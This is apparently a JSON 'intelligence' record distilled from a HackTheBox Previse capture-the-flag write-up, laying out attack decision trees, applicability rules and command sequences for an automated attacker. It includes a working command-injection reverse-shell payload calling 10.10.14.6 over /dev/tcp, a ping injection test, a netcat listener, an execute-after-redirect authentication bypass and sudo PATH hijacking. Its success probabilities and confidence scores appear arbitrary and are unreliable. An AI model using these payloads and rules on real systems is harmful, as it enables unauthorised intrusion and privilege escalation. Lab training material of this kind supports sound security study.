@@ -1,0 +1,929 @@
+{
+  "writeup_id": "Htb_Previse",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_ear_command_injection",
+    "primary_services": [
+      "http",
+      "ssh",
+      "mysql"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+http",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "execute_after_redirect",
+    "privilege_path": "web_to_user_to_root",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "ear_vulnerability_302_redirect",
+      "command_injection_in_php",
+      "path_hijacking_sudo_script"
+    ],
+    "environmental_clues": [
+      "php_web_application",
+      "mysql_database_backend",
+      "ubuntu_18_04_bionic",
+      "apache_2_4_29"
+    ],
+    "similar_scenarios": [
+      "previse_htb_easy",
+      "basic_web_exploitation"
+    ],
+    "unique_aspects": [
+      "execute_after_redirect_bypass",
+      "source_code_download_zip",
+      "hash_cracking_database_dump"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Execute After Redirect (EAR)",
+        "success_reason": "PHP code sent redirect but continued executing without exit statement",
+        "prerequisite_indicators": [
+          "php_application_present",
+          "302_redirects_with_content",
+          "session_based_authentication"
+        ],
+        "recognition_patterns": [
+          "302 response contains full HTML page",
+          "content-length > 0 in redirect response",
+          "restricted pages accessible via direct request"
+        ],
+        "failure_modes": [
+          "proper_exit_after_redirect",
+          "server_side_redirect_handling",
+          "no_sensitive_content_in_redirect"
+        ],
+        "environmental_factors": [
+          "inexperienced_php_developers",
+          "lack_of_security_code_review",
+          "improper_authentication_implementation"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "Command Injection via Parameter",
+        "success_reason": "User input directly passed to shell command without sanitization",
+        "prerequisite_indicators": [
+          "parameter_accepts_user_input",
+          "backend_processing_suggests_shell_usage",
+          "file_processing_functionality"
+        ],
+        "recognition_patterns": [
+          "delimiter parameter in POST request",
+          "file format conversion functionality",
+          "different outputs based on parameter values"
+        ],
+        "failure_modes": [
+          "input_sanitization_present",
+          "parameterized_queries_used",
+          "restricted_shell_environment"
+        ],
+        "environmental_factors": [
+          "php_exec_functions_enabled",
+          "web_server_shell_access",
+          "insufficient_input_validation"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Sudo Path Hijacking",
+        "success_reason": "Bash script used relative paths without full qualification",
+        "prerequisite_indicators": [
+          "sudo_privileges_on_script",
+          "script_uses_system_commands",
+          "path_manipulation_possible"
+        ],
+        "recognition_patterns": [
+          "sudo -l shows script permissions",
+          "script contains unqualified commands",
+          "writable_directories_in_path"
+        ],
+        "failure_modes": [
+          "absolute_paths_used",
+          "secure_path_configured",
+          "script_input_validation"
+        ],
+        "environmental_factors": [
+          "default_sudo_configuration",
+          "developer_written_scripts",
+          "insufficient_privilege_separation"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "accounts.php accessible via EAR vulnerability",
+        "discovery_method": "Burp proxy response modification",
+        "why_critical": "Allowed user account creation without authentication",
+        "how_to_recognize": [
+          "302 responses with substantial content-length",
+          "admin functionality in redirect responses",
+          "session checks without proper exit"
+        ],
+        "follow_up_actions": [
+          "create_privileged_user_account",
+          "access_restricted_functionality",
+          "download_sensitive_files"
+        ]
+      },
+      {
+        "discovery": "SITEBACKUP.ZIP source code",
+        "discovery_method": "Authenticated file download",
+        "why_critical": "Revealed command injection vulnerability in logs.php",
+        "how_to_recognize": [
+          "backup files in web directory",
+          "source code exposure",
+          "development artifacts"
+        ],
+        "follow_up_actions": [
+          "analyze_source_for_vulnerabilities",
+          "identify_database_credentials",
+          "map_application_functionality"
+        ]
+      },
+      {
+        "discovery": "Database credentials in config.php",
+        "discovery_method": "Source code analysis",
+        "why_critical": "Enabled database access for password hash extraction",
+        "how_to_recognize": [
+          "config files in source code",
+          "database connection strings",
+          "hardcoded credentials"
+        ],
+        "follow_up_actions": [
+          "connect_to_database",
+          "dump_user_tables",
+          "crack_password_hashes"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "Database_Hash_Cracking",
+        "why_possible": "Weak password hashing and crackable passwords in database",
+        "recognition_signs": [
+          "database_access_available",
+          "user_password_hashes_present",
+          "weak_hashing_algorithms"
+        ],
+        "exploitation_path": "MySQL Access → Hash Dump → Hashcat → SSH Login"
+      },
+      {
+        "privilege_level": "user",
+        "escalation_method": "Sudo_Path_Hijacking",
+        "why_possible": "Sudo script used relative paths for system commands",
+        "recognition_signs": [
+          "sudo_permissions_on_scripts",
+          "unqualified_command_paths",
+          "path_environment_control"
+        ],
+        "exploitation_path": "PATH Manipulation → Malicious Binary → Sudo Execution → Root"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 (SSH) and 80 (HTTP) open on Linux host",
+        "decision": "Focus on web application enumeration and vulnerability assessment",
+        "reasoning": "Limited attack surface requires thorough web app analysis",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_bruteforce",
+            "when": "if web app fails"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if known CVEs exist"
+          }
+        ],
+        "success_indicators": [
+          "web_app_accessible",
+          "login_page_found",
+          "technology_stack_identified"
+        ],
+        "next_decision": "analyze_web_app_authentication"
+      },
+      {
+        "step": 2,
+        "situation": "Web app redirects to login page with 302 response containing full page content",
+        "decision": "Test for Execute After Redirect (EAR) vulnerability",
+        "reasoning": "302 responses with content indicate potential authentication bypass",
+        "confidence": 0.85,
+        "prerequisites": [
+          "http_proxy_available",
+          "response_interception_enabled"
+        ],
+        "success_indicators": [
+          "restricted_pages_accessible",
+          "admin_functions_visible"
+        ],
+        "failure_fallbacks": [
+          "credential_bruteforce",
+          "directory_enumeration"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "EAR vulnerability confirmed, found account creation page accessible",
+        "decision": "Create legitimate user account through exposed admin function",
+        "reasoning": "Direct path to authenticated access without credential attacks",
+        "confidence": 0.95,
+        "prerequisites": [
+          "accounts_page_accessible"
+        ],
+        "success_indicators": [
+          "account_created_successfully",
+          "login_successful"
+        ],
+        "next_decision": "enumerate_authenticated_features"
+      },
+      {
+        "step": 4,
+        "situation": "Authenticated access obtained, found file download and log processing features",
+        "decision": "Download source code backup and analyze for vulnerabilities",
+        "reasoning": "Source code provides complete attack surface visibility",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "parameter_fuzzing",
+            "when": "if source unavailable"
+          },
+          {
+            "option": "blind_injection_testing",
+            "when": "if no source access"
+          }
+        ],
+        "success_indicators": [
+          "source_code_downloaded",
+          "dangerous_functions_identified"
+        ],
+        "next_decision": "analyze_command_injection_vectors"
+      },
+      {
+        "step": 5,
+        "situation": "Found exec() function in logs.php with user input interpolation",
+        "decision": "Exploit command injection in log delimiter parameter",
+        "reasoning": "Direct command execution with unsanitized user input",
+        "confidence": 0.95,
+        "prerequisites": [
+          "authenticated_session",
+          "logs_page_accessible"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed",
+          "reverse_shell_obtained"
+        ],
+        "next_decision": "privilege_escalation_enumeration"
+      }
+    ],
+    "branching_logic": {
+      "if_ear_vulnerability_found": {
+        "action": "bypass_authentication_and_create_account",
+        "tools": [
+          "burp_proxy",
+          "response_modification"
+        ],
+        "next_phase": "authenticated_enumeration"
+      },
+      "if_source_code_available": {
+        "action": "static_code_analysis_for_vulnerabilities",
+        "tools": [
+          "grep",
+          "manual_review"
+        ],
+        "focus": [
+          "exec_functions",
+          "user_input_handling",
+          "sql_queries"
+        ]
+      },
+      "if_command_injection_found": {
+        "action": "establish_reverse_shell",
+        "payload_format": "delim=comma;[COMMAND]",
+        "next_phase": "privilege_escalation"
+      },
+      "if_database_access_needed": {
+        "action": "extract_credentials_from_config",
+        "purpose": "access_user_hashes_for_lateral_movement",
+        "tools": [
+          "mysql_client",
+          "hash_cracking"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_302_responses_for_content",
+        "reasoning": "ear_vulnerabilities_commonly_missed_by_automated_tools",
+        "applicability": "web_applications_with_authentication"
+      },
+      {
+        "rule": "prioritize_source_code_download_when_available",
+        "reasoning": "complete_vulnerability_visibility_vs_blind_testing",
+        "applicability": "any_web_application"
+      },
+      {
+        "rule": "test_command_injection_on_system_integration_points",
+        "reasoning": "log_processing_file_operations_often_use_system_calls",
+        "applicability": "applications_with_file_processing_features"
+      },
+      {
+        "rule": "extract_database_credentials_after_initial_compromise",
+        "reasoning": "user_password_reuse_for_lateral_movement",
+        "applicability": "web_applications_with_databases"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Execute After Redirect (EAR)",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "php_application",
+          "session_based_authentication",
+          "improper_redirect_implementation"
+        ],
+        "success_indicators": [
+          "302_redirect_with_content_body",
+          "content_length_greater_than_zero_on_redirect",
+          "full_html_page_in_redirect_response",
+          "session_cookie_set_on_redirect"
+        ],
+        "incompatible_with": [
+          "proper_exit_after_redirect",
+          "javascript_only_redirects",
+          "server_side_enforcement"
+        ],
+        "confidence_boosters": [
+          "php_file_extensions",
+          "phpsessid_cookie_present",
+          "admin_panels_detected",
+          "restricted_pages_enumerated"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Command Injection",
+        "mitre_id": "T1059",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "user_input_processed_by_system",
+          "insufficient_input_validation",
+          "system_command_execution"
+        ],
+        "success_indicators": [
+          "system_command_output_in_response",
+          "time_delays_on_sleep_commands",
+          "reverse_shell_connection",
+          "file_system_access_achieved"
+        ],
+        "incompatible_with": [
+          "strict_input_validation",
+          "command_whitelisting",
+          "sandboxed_execution"
+        ],
+        "confidence_boosters": [
+          "source_code_available",
+          "file_processing_functionality",
+          "log_processing_features",
+          "system_integration_points"
+        ],
+        "typical_success_rate": 0.82,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Path Hijacking Privilege Escalation",
+        "mitre_id": "T1574.007",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux",
+          "unix"
+        ],
+        "environmental_prerequisites": [
+          "sudo_privileges_available",
+          "script_with_relative_paths",
+          "writable_path_directory",
+          "sudo_script_execution"
+        ],
+        "success_indicators": [
+          "sudo_l_shows_script_permissions",
+          "script_uses_relative_commands",
+          "path_directory_writable",
+          "script_execution_as_root"
+        ],
+        "incompatible_with": [
+          "absolute_paths_only",
+          "secure_path_enforcement",
+          "restricted_sudo_environment"
+        ],
+        "confidence_boosters": [
+          "bash_scripts_in_sudo",
+          "system_administration_scripts",
+          "backup_or_maintenance_scripts",
+          "default_path_configuration"
+        ],
+        "typical_success_rate": 0.88,
+        "estimated_time": "5-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "php_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "php",
+          "PHPSESSID",
+          ".php"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "OpenSSH"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "Linux"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "mysql_database": {
+        "port_indicators": [
+          3306
+        ],
+        "service_indicators": [
+          "mysql"
+        ],
+        "technology_indicators": [
+          "MySQL",
+          "MariaDB"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "execute_after_redirect",
+          "when": "php_web_application_detected",
+          "reason": "often_reveals_admin_panels_and_functionality"
+        },
+        {
+          "attack": "source_code_analysis",
+          "when": "source_code_accessible",
+          "reason": "reveals_vulnerabilities_and_attack_vectors"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "command_injection_testing",
+          "when": "file_processing_functionality_detected",
+          "reason": "common_in_file_handling_applications"
+        },
+        {
+          "attack": "database_credential_extraction",
+          "when": "database_access_achieved",
+          "reason": "often_leads_to_credential_reuse"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "path_hijacking",
+          "when": "sudo_access_available",
+          "reason": "requires_initial_system_access"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Execute After Redirect (EAR)",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Burp Suite",
+            "command_template": "Change HTTP response from '302 Found' to '200 OK'",
+            "actual_command": "Proxy > Options > Match and Replace > Add rule to replace '302 Found' with '200 OK'",
+            "output_pattern": "Access to restricted pages without authentication",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "web_application_with_redirect_vulnerability",
+          "proxy_tool_available",
+          "ability_to_intercept_http_responses"
+        ],
+        "success_indicators": [
+          "access_to_restricted_pages",
+          "ability_to_view_admin_functionality",
+          "bypass_authentication_checks"
+        ],
+        "common_failures": [
+          "proper_exit_after_redirect",
+          "server_side_session_validation",
+          "javascript_based_redirects"
+        ],
+        "follow_up_techniques": [
+          "account_creation",
+          "source_code_download",
+          "command_injection"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Command Injection via Web Parameter",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Burp Suite",
+            "command_template": "delim={payload}",
+            "actual_command": "delim=comma;bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261' #",
+            "output_pattern": "Reverse shell connection",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "tcpdump",
+            "command_template": "sudo tcpdump -i {interface} icmp",
+            "actual_command": "sudo tcpdump -i tun0 icmp",
+            "output_pattern": "ICMP echo request/reply packets",
+            "effectiveness_rating": 4,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "web_application_with_user_input",
+          "unsafe_exec_function_usage",
+          "network_connectivity_for_reverse_shell"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed",
+          "reverse_shell_established",
+          "system_level_access_gained"
+        ],
+        "common_failures": [
+          "input_sanitization_present",
+          "network_filtering_blocks_connections",
+          "command_syntax_errors"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "lateral_movement",
+          "persistence_establishment"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Source Code Analysis for Vulnerabilities",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "grep",
+            "command_template": "grep -R -e system -e exec -e passthru -e '`' -e popen -e proc_open *",
+            "actual_command": "grep -R -e system -e exec -e passthru -e '`' -e popen -e proc_open *",
+            "output_pattern": "Dangerous PHP function usage locations",
+            "effectiveness_rating": 5,
+            "reliability": 0.99
+          }
+        ],
+        "prerequisites": [
+          "access_to_source_code",
+          "knowledge_of_dangerous_functions",
+          "command_line_access"
+        ],
+        "success_indicators": [
+          "dangerous_functions_identified",
+          "potential_injection_points_found",
+          "code_execution_paths_mapped"
+        ],
+        "common_failures": [
+          "obfuscated_code",
+          "indirect_function_calls",
+          "missing_source_files"
+        ],
+        "follow_up_techniques": [
+          "exploit_development",
+          "payload_crafting",
+          "vulnerability_validation"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Burp Suite",
+        "use_case": "web_application_security_testing",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_application_penetration_testing"
+        ],
+        "alternatives": [
+          "OWASP ZAP",
+          "manual_curl_requests"
+        ],
+        "best_practices": [
+          "configure_match_replace_rules_for_common_bypasses",
+          "enable_response_interception_when_needed",
+          "use_repeater_for_payload_testing"
+        ]
+      },
+      {
+        "tool": "nmap",
+        "use_case": "network_reconnaissance",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "initial_reconnaissance"
+        ],
+        "alternatives": [
+          "masscan",
+          "rustscan"
+        ],
+        "best_practices": [
+          "start_with_fast_port_scan",
+          "follow_up_with_service_detection",
+          "use_appropriate_timing_templates"
+        ]
+      },
+      {
+        "tool": "feroxbuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_enumeration"
+        ],
+        "alternatives": [
+          "gobuster",
+          "dirbuster",
+          "ffuf"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists",
+          "configure_proper_extensions",
+          "respect_rate_limits"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "ear_vulnerability_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Configure Burp Match/Replace: '302 Found' -> '200 OK'",
+            "purpose": "Bypass authentication redirects",
+            "expected_output": "Access to restricted pages"
+          },
+          {
+            "step": 2,
+            "command": "Navigate to /accounts.php and create user account",
+            "purpose": "Establish legitimate access",
+            "expected_output": "User account created successfully"
+          },
+          {
+            "step": 3,
+            "command": "Login with created credentials",
+            "purpose": "Authenticate to application",
+            "expected_output": "Authenticated session established"
+          },
+          {
+            "step": 4,
+            "command": "Download SITEBACKUP.ZIP from /files.php",
+            "purpose": "Obtain source code for analysis",
+            "expected_output": "Source code archive downloaded"
+          },
+          {
+            "step": 5,
+            "command": "grep -R -e system -e exec -e passthru -e '`' -e popen -e proc_open *",
+            "purpose": "Identify dangerous PHP functions",
+            "expected_output": "Command injection vulnerability in logs.php"
+          },
+          {
+            "step": 6,
+            "command": "POST to /logs.php with delim=comma;bash -c 'bash -i >&/dev/tcp/10.10.14.6/443 0>&1' #",
+            "purpose": "Execute reverse shell payload",
+            "expected_output": "Reverse shell as www-data"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "20-45 minutes"
+      },
+      {
+        "sequence_name": "command_injection_testing",
+        "steps": [
+          {
+            "step": 1,
+            "command": "sudo tcpdump -i tun0 icmp",
+            "purpose": "Monitor for ICMP traffic",
+            "expected_output": "Listening for ICMP packets"
+          },
+          {
+            "step": 2,
+            "command": "POST delim=comma;ping -c 1 10.10.14.6 # to /logs.php",
+            "purpose": "Test command injection with ping",
+            "expected_output": "ICMP packets received confirming RCE"
+          },
+          {
+            "step": 3,
+            "command": "nc -lnvp 443",
+            "purpose": "Setup reverse shell listener",
+            "expected_output": "Listening on port 443"
+          },
+          {
+            "step": 4,
+            "command": "POST reverse shell payload via delim parameter",
+            "purpose": "Execute reverse shell",
+            "expected_output": "Shell connection established"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "10-20 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Previse",
+      "difficulty": "Easy",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2021-08-07",
+      "author": "m4lwhere",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "web_application",
+        "command_injection",
+        "path_hijacking"
+      ],
+      "key_vulnerabilities": [
+        "execute_after_redirect",
+        "command_injection",
+        "sudo_path_hijacking"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "web_vulnerabilities",
+        "command_injection",
+        "sudo_exploitation"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_testing",
+        "linux_fundamentals",
+        "sudo_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "command_injection",
+        "privilege_escalation",
+        "authentication_bypass"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "proper_redirect_handling",
+        "input_validation",
+        "secure_sudo_configuration"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Knife",
+        "Shocker",
+        "Bashed"
+      ],
+      "similarity_reasons": [
+        "web_application_focus",
+        "command_injection",
+        "straightforward_privesc"
+      ],
+      "unique_aspects": [
+        "execute_after_redirect_vulnerability",
+        "database_hash_cracking",
+        "path_hijacking"
+      ],
+      "difficulty_factors": [
+        "clear_attack_path",
+        "common_web_vulnerabilities",
+        "basic_linux_privesc"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T15:57:24.456799",
+    "original_file": "0xdf_writeups/Htb Previse.md",
+    "content_length": 27934,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
